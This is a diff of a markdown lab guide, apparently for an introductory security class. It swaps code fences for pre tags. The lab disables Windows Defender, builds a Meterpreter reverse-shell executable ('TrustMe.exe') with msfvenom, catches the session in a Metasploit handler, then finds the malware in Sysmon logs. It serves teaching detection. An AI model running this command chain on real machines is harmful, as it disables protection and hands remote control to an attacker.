@@ -4,7 +4,7 @@ Let’s disable **Defender**. Simply run the following from an **Administrator P
 
 ![](attachments/OpeningPowershell.png)
 
-```Set-MpPreference -DisableRealtimeMonitoring $true```
+<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
 
 This will disable **Defender** for this session.
 
@@ -22,7 +22,7 @@ Alternatively, you can click on the **Kali** icon in the taskbar.
 
 Once the terminal opens, please run the following command:
 
-```ifconfig```
+<pre>ifconfig</pre>
 
 ![](attachments/ifconfig.png)
 
@@ -32,9 +32,9 @@ Please note the IP address of **your** Ethernet adapter.
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
  
- ```sudo su -```
+ <pre>sudo su -</pre>
 
-```msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe```
+</pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
 Now, let's start the **Metasploit** Handler.  First, open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
 
@@ -42,23 +42,23 @@ Now, let's start the **Metasploit** Handler.  First, open a new **Kali** termina
 
 Let's become root.
 
-```sudo su -```
+<pre>sudo su -</pre>
 
 Now let's start the **Metasploit** Handler
 
-```msfconsole -q```
+<pre>msfconsole -q</pre>
 
 We are going to run the following commands to correctly set the parameters:
 
-```use exploit/multi/handler```
+<pre>use exploit/multi/handler</pre>
 
-```set PAYLOAD windows/meterpreter/reverse_tcp```
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-```set LHOST 10.10.1.117```
+<pre>set LHOST 10.10.1.117</pre>
 
 Remember, **your IP will be different!**
 
-```exploit```
+<pre>exploit</pre>
 
 It should look like this:
 
@@ -68,9 +68,9 @@ Now, we will need to open an **cmd.exe terminal as Administrator**.
 
 ![](attachments/OpeningWindowsCommandPrompt.png)
 
-```cd \IntroLabs```
+<pre>cd \IntroLabs</pre>
 
-```Sysmon64.exe -accepteula -i sysmonconfig-export.xml```
+<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>
 
 It should look like this:
 
@@ -78,11 +78,11 @@ It should look like this:
 
 let's run the following commands to run the **"TrustMe.exe"** file.
 
-```cd \```
+<pre>cd \</pre>
  
 Then run it with the following:
 
- ```TrustMe.exe```
+ <pre>TrustMe.exe</pre>
 
 Back at your Kali terminal, you should have a metasploit session!
 
@@ -108,3 +108,6 @@ Start at the top and work down through the logs, you should see your **malware**
 ![](attachments/logs.png)
 
 ![](attachments/processcreateview.png)
+
+***
+[Back to Navigation Menu](/IntroClassFiles/navigation.md)
